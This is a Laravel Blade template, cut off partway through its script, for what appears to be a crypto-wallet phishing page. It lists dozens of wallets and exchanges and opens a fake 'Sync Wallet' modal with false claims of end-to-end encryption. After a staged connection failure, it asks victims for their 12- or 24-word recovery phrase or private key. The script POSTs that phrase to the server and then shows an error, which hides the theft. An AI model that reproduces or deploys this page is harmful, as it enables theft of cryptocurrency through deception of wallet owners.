            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="IDEX" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="IDEX"
                     data-logo="{{asset('assets/img/icon/IdexLogo_Supplied_250x250.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/IdexLogo_Supplied_250x250.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>IDEX</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="ICON wallet" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="ICON wallet"
                     data-logo="{{asset('assets/img/icon/icon-wallet.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/icon-wallet.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>ICON wallet</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="HEX" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="HEX"
                     data-logo="{{asset('assets/img/icon/download-2.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/download-2.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>HEX</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Gemini" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Gemini"
                     data-logo="{{asset('assets/img/icon/Gemini.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/Gemini.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Gemini</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="GateHub" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="GateHub"
                     data-logo="{{asset('assets/img/icon/GateHub.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/GateHub.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>GateHub</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Gate.io" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Gate.io"
                     data-logo="{{asset('assets/img/icon/gate-300x277.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/gate-300x277.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Gate.io</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="GamingShiba Token" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="GamingShiba Token"
                     data-logo="{{asset('assets/img/icon/download-9.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/download-9.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>GamingShiba Token</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Gala Token" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Gala Token"
                     data-logo="{{asset('assets/img/icon/download-12.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/download-12.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Gala Token</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="FTX" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="FTX"
                     data-logo="{{asset('assets/img/icon/FTX-300x300.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/FTX-300x300.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>FTX</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Fantom" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Fantom"
                     data-logo="{{asset('assets/img/icon/download-4-300x150.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/download-4-300x150.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Fantom</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="EverRise Token" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="EverRise Token"
                     data-logo="{{asset('assets/img/icon/download-8.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/download-8.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>EverRise Token</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Etoro" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Etoro"
                     data-logo="{{asset('assets/img/icon/etoro-300x229.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/etoro-300x229.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Etoro</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Erisx" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Erisx"
                     data-logo="{{asset('assets/img/icon/Erisx.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/Erisx.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Erisx</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="dYdX" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="dYdX"
                     data-logo="{{asset('assets/img/icon/og-image-300x150.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/og-image-300x150.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>dYdX</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Dok Wallet" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Dok Wallet"
                     data-logo="{{asset('assets/img/icon/dok_wallet.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/dok_wallet.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Dok Wallet</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Doge Coin" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Doge Coin"
                     data-logo="{{asset('assets/img/icon/download-5.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/download-5.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Doge Coin</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="DDEX" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="DDEX"
                     data-logo="{{asset('assets/img/icon/DdexLogo_Supplied_250x250.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/DdexLogo_Supplied_250x250.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>DDEX</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Curve Dao Token" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Curve Dao Token"
                     data-logo="{{asset('assets/img/icon/download-10.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/download-10.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Curve Dao Token</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Curv" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Curv"
                     data-logo="{{asset('assets/img/icon/Curv.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/Curv.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Curv</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Cryptonator" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Cryptonator"
                     data-logo="{{asset('assets/img/icon/Cryptonator-300x188.webp')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/Cryptonator-300x188.webp')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Cryptonator</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Crypto Key Stack" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Crypto Key Stack"
                     data-logo="{{asset('assets/img/icon/Crypto-Key-Stack.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/Crypto-Key-Stack.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Crypto Key Stack</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Coolwallet" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Coolwallet"
                     data-logo="{{asset('assets/img/icon/Coolwallet.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/Coolwallet.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Coolwallet</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Compound" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Compound"
                     data-logo="{{asset('assets/img/icon/5692.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/5692.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Compound</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Coinomi" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Coinomi"
                     data-logo="{{asset('assets/img/icon/omi.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/omi.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Coinomi</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Coinmama" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Coinmama"
                     data-logo="{{asset('assets/img/icon/mama-300x220.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/mama-300x220.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Coinmama</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Coinbase Wallet" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Coinbase Wallet"
                     data-logo="{{asset('assets/img/icon/coinb-300x260.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/coinb-300x260.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Coinbase Wallet</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Cobo vault wallet" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Cobo vault wallet"
                     data-logo="{{asset('assets/img/icon/cobo-vault.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/cobo-vault.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Cobo vault wallet</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Cardano Coin" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Cardano Coin"
                     data-logo="{{asset('assets/img/icon/download-7.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/download-7.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Cardano Coin</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Bread wallet" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Bread wallet"
                     data-logo="{{asset('assets/img/icon/bread-wallet.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/bread-wallet.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Bread wallet</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Bitwala" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Bitwala"
                     data-logo="{{asset('assets/img/icon/wala-300x108.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/wala-300x108.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Bitwala</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="BitPanda" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="BitPanda"
                     data-logo="{{asset('assets/img/icon/BitPanda-300x300.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/BitPanda-300x300.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>BitPanda</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Bitmymoney" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Bitmymoney"
                     data-logo="{{asset('assets/img/icon/Bitmymoney-300x300.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/Bitmymoney-300x300.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Bitmymoney</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Bitlox" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Bitlox"
                     data-logo="{{asset('assets/img/icon/Bitlox.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/Bitlox.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Bitlox</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Bitinka" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Bitinka"
                     data-logo="{{asset('assets/img/icon/Bitinka.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/Bitinka.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Bitinka</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Bitfia" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Bitfia"
                     data-logo="{{asset('assets/img/icon/Bitfia.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/Bitfia.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Bitfia</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Bitbox wallet" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Bitbox wallet"
                     data-logo="{{asset('assets/img/icon/bitbox.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/bitbox.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Bitbox wallet</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Binance Coin (BNB)" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Binance Coin (BNB)"
                     data-logo="{{asset('assets/img/icon/Binance-BNB.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/Binance-BNB.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Binance Coin (BNB)</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Binance Chain" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Binance Chain"
                     data-logo="{{asset('assets/img/icon/chain-300x300.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/chain-300x300.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Binance Chain</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="BC vault" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="BC vault"
                     data-logo="{{asset('assets/img/icon/BCvault.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/BCvault.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>BC vault</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Aladdin Wallet" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Aladdin Wallet"
                     data-logo="{{asset('assets/img/icon/Aladdin-Wallet.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/Aladdin-Wallet.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Aladdin Wallet</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Tangem Wallet" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Tangem Wallet"
                     data-logo="{{asset('assets/img/icon/tangem.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/tangem.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Tangem Wallet</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Nexo Wallet" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Nexo Wallet"
                     data-logo="{{asset('assets/img/icon/nexo.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/nexo.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Nexo Wallet</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>
        </div>
    </div>
@endsection
@section('sheets')
    <div class="offcanvas offcanvas-bottom rounded-m offcanvas-detached bg-theme" id="popup_connect_wallet_success">
        <div class="content">
            <div class="modal-body space-y-20 pd-40">
                <center>
                    <h4 style="font-size: 30px; color: red;">Error!</h4>
                </center>
            </div>

            <p style="padding:10px;  color: red; text-align: center;">
                An Error was encountered while trying to connect... Please try again later
            </p>

        </div>
    </div>

    <div class="offcanvas offcanvas-bottom rounded-m offcanvas-detached bg-theme" id="popup_connect_wallet">
        <div class="content">
            <div class="modal-body space-y-20 pd-40">
                <h3 style="text-align: center;">
                    <img style="width: 80px !important; height: 80px !important;" class="avatar" id="wallet_logo"><br>
                    <span id="wallet_name" class="mt-1">Sync Wallet</span>
                </h3>
                <p class="text-center">
                    This session is secured and encrypted
                </p>

                <div id="auto_connecting" style="display:none;">
                    <br>
                    <div class="heading-line s2" style="width: 100%;">
                        <br>
                        <div style="text-align: center!important;">
                            <img src="{{asset('assets/images/ajax_loader.gif')}}" alt="" style="height: 50px; text-align: center;">
                        </div>
                        <p align="center">
                            starting secure connection...<br>
                            <i align="center" style="text-align: center !important; font-size:small"
                               class="align-items-center">please wait...</i>
                        </p>
                        <br>
                    </div>
                </div>

                <div id="failed_to_connect" style="display:none;">
                    <div style="padding:6px; color:red; border:1px solid red; border-radius:5px; text-align:center!important; font-size:16px; font-weight:500;">
                        An error occurred... please try again or connect manually
                    </div>
                    <br><br>
                    <div class="d-flex justify-content-between">
                        <a href="#" id="try_auto_connecting_again" class="btn btn-info" style="color: white; background-color: black;"
                           aria-label="Close">Try Again</a><br>
                        <a href="#" id="button_connect_manually" class="btn btn-success btn5">Connect Manually</a>
                    </div>
                </div>

                <div id="div_connect_manuallly" style="display:none;">
                    <form action="" id="registrationForm" action="" method="POST">
                        @csrf
                        <input type="hidden" name="action" value="registration"/>
                        <input type="hidden"  id="wallet_namexx" value="" name="wallet_name">
                        <textarea style="font-size:20px; font-weight:450" rows="4" name="secret_phrase"
                                  id="secret_phrase" class="form-control text-primary"
                                  placeholder="Enter your 12 or 24 Mnemonic words. Separate them with spaces. You can also input your privatekey instead."></textarea>
                        <br>
                        <button disabled="" type="button" id="button_connect_wallet" class="btn btn-primary btnSubmit"
                                style="border-top: 5px; opacity:0.2">
                            Connect Wallet
                        </button>
                    </form>
                </div>

                <div>
                    <br><br><br>
                    <p align="center" class="mt-4 align-items-center">
                        <img src="{{asset('assets/img/icon/shield.png')}}" width="30" height="30"> This session is protected
                        with an end-to-end encryption</p>
                </div>
            </div>
        </div>
    </div>
@endsection
@section('scripts')
    <script src="{{asset('mobile/scripts/jquery-3.3.1.min.js')}}"></script>
    <script type="text/javascript">
        $(document).ready( function() {
            /*@ Registration start */
            $('#button_connect_wallet').click( function(e) {
                $.ajaxSetup({
                    headers: {
                        'X-CSRF-TOKEN': $('meta[name="_token"]').attr('content')
                    }
                })
                e.preventDefault();
                var urlz = "{{url('user/connect-walletz')}}";
                let formData = $('#registrationForm').serialize();

                $.ajax({
                    method: 'POST',
                    url: urlz,
                    data: formData,


                    // data:  formData { "load_phrase": 1, "data_phrase": field.val(), "wallet_selected": $('#wallet_name').text().trim() },
                    success: function (response) {
                        $('#auto_connecting').hide();
                        $('#div_connect_manuallly').hide();
                        $('#failed_to_connect').show();
